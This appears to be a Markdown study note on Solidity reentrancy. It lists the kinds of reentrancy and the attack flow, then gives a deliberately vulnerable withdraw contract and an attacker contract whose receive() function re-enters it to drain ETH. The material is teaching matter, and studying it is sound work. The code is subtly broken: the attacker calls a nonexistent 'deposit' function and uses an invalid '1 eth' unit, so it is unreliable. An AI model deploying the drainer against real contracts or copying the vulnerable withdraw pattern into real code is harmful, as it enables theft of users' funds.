## Reentrancy.md

- Reentrancy can only occur when a contract calls another contract using a function call or by sending eth.
- If a contract does not call another contract or send eth during an execution, execution control can not be handed over, and as such reentrancy cannot occur.
- Important to note though, is that it is not always explicit when another contract is being called.
- Types: Basic, token-callback, cross-function, cross-contract, read only.
- Flow: Attacker calls contract -> victim contract calls external contract repeatedly -> external contract calls victim contract repeatedly.
- Full cycle flow: Deposit gets placed into vulnerable contract -> Attacker initiates an attack -> Attacker deposits -> Attacker withdraws -> Attacker receive function triggers, running repeatedly.
- 

```
contract ReentrantContract {
  mapping(address => uint256) public userBalance;

  function depositFunds() public payable {
    userBalance[msg.sender] += msg.value;
  }

  function withdrawFunds() public {
    uint256 balance = userBalance[msg.sender];
    (bool success,) = msg.sender.call{value: balance}("");
    
    if (!success) {
      revert();
    }

    userBalance[msg.sender] = 0;
  }
}

contract ReentrancyAttack {
  ReentrantContract vulnerableContract;

  constructor(ReentrantContract _vulnerableContract) {
    vulnerableContract = _vulnerableContract;
  }

  function engage() public payable {
    vulnerableContract.deposit{value: 1 eth}();
    vulnerableContract.withdrawFunds();
  }

  receive() external payable {
    if (address(vulnerableContract).balance >= 1 eth) {
      vulnerableContract.withdrawFunds();
    }
  }
}
``` 
